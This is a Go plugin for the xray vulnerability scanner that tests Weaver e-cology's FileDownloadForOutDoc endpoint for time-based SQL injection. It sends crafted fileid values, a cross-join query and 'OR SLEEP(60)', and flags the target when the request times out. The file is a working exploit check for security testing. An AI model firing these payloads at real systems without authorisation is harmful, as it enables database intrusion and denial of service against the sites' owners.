package plugin

import (
	"fmt"
	"git.in.chaitin.net/lohengrin/xraykit/event"
	"git.in.chaitin.net/lohengrin/xraykit/plugin/module/xhttp"
	"git.in.chaitin.net/lohengrin/xraykit/xray"
	"math/rand"
	"net"
	"net/url"
	"time"
)

func generateRandomNumberString(minLength, maxLength int) string {
	length := rand.Intn(maxLength-minLength+1) + minLength
	result := make([]byte, length)

	for i := 0; i < length; i++ {
		result[i] = byte(rand.Intn(10) + 48) // 生成ASCII码为48-57的数字字符
	}

	return string(result)
}

var _ = xray.NewPlugin("poc-go-ecology_filedownloadforoutdoc-sqli", func(p *xray.Plugin, client *xhttp.Client) {
	rand.Seed(time.Now().UnixNano())
	p.Event(func(website *event.Website) *event.Vulnerability {
		payloads := []string{url.QueryEscape(generateRandomNumberString(5, 7) + "\nSELECT * FROM HtmlLabelInfo a CROSS JOIN HtmlLabelIndex b CROSS JOIN HtmlLabelInfo c"), url.QueryEscape(generateRandomNumberString(5, 7) + " OR SLEEP(60)")}
		for _, payload := range payloads {
			req, _, err := xhttp.LoadFromEvent(website.HttpFlow)
			p.Check(err)

			// 发起第一次延迟请求
			r0 := req.Clone()
			r0.Method = "POST"
			r0.SetHeader("Content-Type", "application/x-www-form-urlencoded")
			r0.SetBody([]byte(fmt.Sprintf("fileid=%s&isFromOutImg=1", payload)))
			p.Check(r0.ReplaceURI("/weaver/weaver.file.FileDownloadForOutDoc"))
			// 如果不存在则说明延时失败，直接返回
			_, err = client.Do(r0)
			if err == nil {
				continue
			}
			if netErr, ok := err.(net.Error); !ok || !netErr.Timeout() {
				continue
			}

			// 发起正常请求
			r1 := req.Clone()
			r1.Method = "POST"
			r1.SetHeader("Content-Type", "application/x-www-form-urlencoded")
			r1.SetBody([]byte(fmt.Sprintf("fileid=%s&isFromOutImg=1", generateRandomNumberString(5, 7))))
			p.Check(r1.ReplaceURI("/weaver/weaver.file.FileDownloadForOutDoc"))
			_, err = client.Do(r1)
			p.Check(err)

			if err == nil {
				vul := p.NewWebVulnerability(website)
				vul.Links = append(vul.Links, "https://stack.chaitin.com/techblog/detail?id=124")
				return vul
			}
		}

		return nil
	})

})
